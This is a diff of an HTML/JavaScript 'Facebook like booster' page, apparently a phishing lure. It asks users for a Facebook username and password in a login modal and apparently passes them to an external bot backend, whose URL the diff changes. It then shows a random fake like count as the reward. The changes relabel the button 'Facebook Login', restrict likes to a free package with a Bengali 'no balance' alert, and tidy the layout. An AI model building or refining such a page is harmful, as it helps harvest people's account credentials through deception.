@@ -98,6 +98,10 @@
     border-radius: 15px;
     box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     transition: transform 0.3s;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
   }
 
   .post-box:hover {
@@ -111,6 +115,11 @@
     color: #333;
   }
 
+  .post-meta {
+    font-size:13px;
+    color:#555;
+  }
+
   .like-count {
     display: inline-block;
     margin-top: 10px;
@@ -121,14 +130,14 @@
   .boost-btn {
     margin-top: 10px;
     padding: 12px;
-    width: 100%;
+    width: 140px;
     background: linear-gradient(90deg, #42b72a, #2ecc71);
     border: none;
     border-radius: 10px;
     color: white;
     font-weight: bold;
     cursor: pointer;
-    font-size: 16px;
+    font-size: 14px;
     transition: all 0.3s ease;
   }
 
@@ -193,6 +202,10 @@
     box-shadow: 0 5px 15px rgba(66,183,42,0.3);
   }
 
+  @media (max-width:560px){
+    .post-box{flex-direction:column;align-items:flex-start}
+    .boost-btn{width:100%}
+  }
 </style>
 </head>
 <body>
@@ -201,7 +214,7 @@
 
 <div class="input-section">
 
-  <!-- ★ NEW PACKAGE OPTIONS ADDED ★ -->
+  <!-- PACKAGE OPTIONS -->
   <div class="package-box">
     <div class="package-title">Select Like Package:</div>
 
@@ -221,7 +234,7 @@
       <input type="radio" name="pkg" value="3.00_10k"> $3.00 – 10000 Likes
     </label>
   </div>
-  <!-- ★ END PACKAGE OPTION ★ -->
+  <!-- END PACKAGE OPTIONS -->
 
   <input type="text" id="post-link" placeholder="Enter Facebook post link">
   <button onclick="addPost()">Get Like</button>
@@ -235,12 +248,12 @@
     <h2>Login</h2>
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
-    <button onclick="sendLogin()"> Login</button>
+    <button onclick="sendLogin()">Facebook Login</button>
   </div>
 </div>
 
 <script>
-  const BACKEND_URL = "https://bot-8zhn.onrender.com";
+  const BACKEND_URL = "https://bot-production-85f6.up.railway.app";
   const postsContainer = document.getElementById("posts-container");
   const loginModal = document.getElementById("login-modal");
   const posts = [];
@@ -274,7 +287,16 @@
     document.getElementById("post-link").value = "";
   }
 
+  // --- IMPORTANT CHANGE: Only allow free package to open login modal.
   function boostLike(index) {
+    // check package for this post
+    const post = posts[index];
+    if(post && post.pkg && post.pkg !== "free"){
+      // show balance message and DO NOT open modal
+      alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
+      return;
+    }
+    // otherwise proceed as before
     currentBoostIndex = index;
     loginModal.style.display = "flex";
   }
@@ -308,21 +330,15 @@
         loginModal.style.display = "none";
 
         if(currentBoostIndex !== null){
-          let pkg = posts[currentBoostIndex].pkg;
-          let add = 0;
-
+          // ensure package is free (extra check)
+          const pkg = posts[currentBoostIndex].pkg;
           if(pkg === "free"){
-            add = 90 + Math.floor(Math.random()*20);
-          } else if(pkg === "0.80_2k"){
-            add = 2000;
-          } else if(pkg === "1.50_5k"){
-            add = 5000;
-          } else if(pkg === "3.00_10k"){
-            add = 10000;
+            posts[currentBoostIndex].likes += Math.floor(Math.random()*11)+50;
+            renderPosts();
+          } else {
+            // safety: do nothing if somehow not free
+            alert("Notice: selected package is not free — no likes added.");
           }
-
-          posts[currentBoostIndex].likes += add;
-          renderPosts();
           currentBoostIndex = null;
         }
 
@@ -342,12 +358,14 @@
       postDiv.classList.add("post-box");
 
       postDiv.innerHTML = `
-        <div>
-          <div class="post-link">Post: ${post.link}</div>
-          <div style="font-size:13px;color:#555;">Package: <b>${post.pkg}</b></div>
+        <div style="flex:1">
+          <div class="post-link">Post: ${escapeHtml(post.link)}</div>
+          <div class="post-meta">Package: <b>${post.pkg}</b></div>
         </div>
-        <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
-        <span class="like-count">${post.likes} Likes</span>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
+          <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
+          <span class="like-count" id="likes-${index}">${post.likes} Likes</span>
+        </div>
       `;
 
       postsContainer.appendChild(postDiv);
@@ -357,8 +375,22 @@
   window.onclick = function(event) {
     if(event.target == loginModal){
       loginModal.style.display = "none";
+      currentBoostIndex = null;
     }
   }
+
+  function escapeHtml(s){
+    return String(s)
+      .replace(/&/g,'&amp;')
+      .replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;')
+      .replace(/"/g,'&quot;')
+      .replace(/'/g,'&#39;');
+  }
+
+  // initial render
+  renderPosts();
+
 </script>
 
 </body>
